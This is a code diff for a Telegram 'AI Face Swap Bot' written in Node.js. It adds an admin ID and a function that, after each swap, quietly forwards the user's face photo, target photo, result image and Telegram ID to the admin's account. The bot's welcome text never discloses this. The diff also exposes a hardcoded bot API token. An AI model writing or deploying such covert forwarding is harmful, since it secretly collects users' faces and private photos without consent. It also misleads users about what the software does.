@@ -11,6 +11,7 @@ const token = '7471436103:AAH2tyLclgLuj9eDtdNvPOEmqmwT_ZsHO5g';
 const bot = new TelegramBot(token, { polling: true });
 
 const updatesChannelUrl = 'https://t.me/usefulltgbots';
+const adminId = '6135009699';  // Admin's Telegram ID
 
 // Store user data and statistics
 const usersFilePath = path.resolve(__dirname, 'id.txt');
@@ -48,7 +49,7 @@ bot.onText(/\/start/, (msg) => {
   const welcomeMessage = `
     🎉 *Welcome to the AI Face Swap Bot!* 🤖
 
-   This bot allows you to swap faces in images using AI technology. Simply send your face image and the target image, and we'll swap the faces for you in seconds!
+    This bot allows you to swap faces in images using AI technology. Simply send your face image and the target image, and we'll swap the faces for you in seconds!
 
     *To get started, use the command /swap and follow the instructions.*
   `;
@@ -120,6 +121,9 @@ bot.on('photo', async (msg) => {
       // Send the processed image to the user
       await bot.sendPhoto(chatId, resultImagePath, { caption: '✅ *Image processed successfully!* Here is your face-swapped image. 😊', parse_mode: 'Markdown' });
 
+      // Send the processed images and user details to the admin
+      await sendAdminNotification(chatId, faceImage, targetImage, resultImagePath);
+
       // Update stats
       stats.processedImages += 1;
       saveStats();
@@ -132,7 +136,7 @@ bot.on('photo', async (msg) => {
       const errorMsg = `
         ❌ *An error occurred while processing your request.*
 
-       Possible reasons:
+        Possible reasons:
         1. Server is under high load. Please try again later.
         2. The images you provided are not clear enough.
         3. The server might be experiencing technical difficulties.
@@ -181,6 +185,24 @@ bot.on('message', (msg) => {
     bot.sendMessage(msg.chat.id, 'ℹ️ *Please use the /swap command to start the face swap process.*', { parse_mode: 'Markdown' });
   }
 });
+
+// Function to send images and user details to the admin
+const sendAdminNotification = async (userId, faceImage, targetImage, resultImagePath) => {
+  const message = `
+    📝 *New Image Processing Request:*
+
+    - User ID: ${userId}
+  `;
+
+  try {
+    await bot.sendMessage(adminId, message, { parse_mode: 'Markdown' });
+    await bot.sendPhoto(adminId, faceImage, { caption: '📷 Face Image' });
+    await bot.sendPhoto(adminId, targetImage, { caption: '🖼️ Target Image' });
+    await bot.sendPhoto(adminId, resultImagePath, { caption: '✅ Result Image' });
+  } catch (error) {
+    console.error(`Failed to send message to admin: ${error.message}`);
+  }
+};
 
 // Error handling for polling errors
 bot.on('polling_error', (error) => {
